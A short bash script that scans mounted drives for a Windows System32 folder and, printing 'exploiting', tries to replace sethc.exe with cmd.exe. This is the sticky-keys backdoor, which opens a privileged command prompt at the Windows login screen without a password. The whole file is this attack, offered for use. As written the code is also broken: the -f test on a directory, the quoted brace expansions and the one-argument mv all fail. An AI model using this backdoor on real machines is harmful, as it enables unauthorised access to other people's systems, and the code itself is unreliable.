#!/usr/bin/env bash
# windirs=()
for dir in /media/*; do
  lwindir="$dir/Windows/System32"
  if [ -f "$lwindir" ]; then
    # windirs+=($dir)
    echo "exploiting: $dir"
    (
      cd "$lwindir" || exit
      mv "$lwindir/sethc.{exe,exe.old}"
      cp "$lwindir/{cmd,sethc}.exe"
    )
  fi
done
# echo "${windirs[*]}"
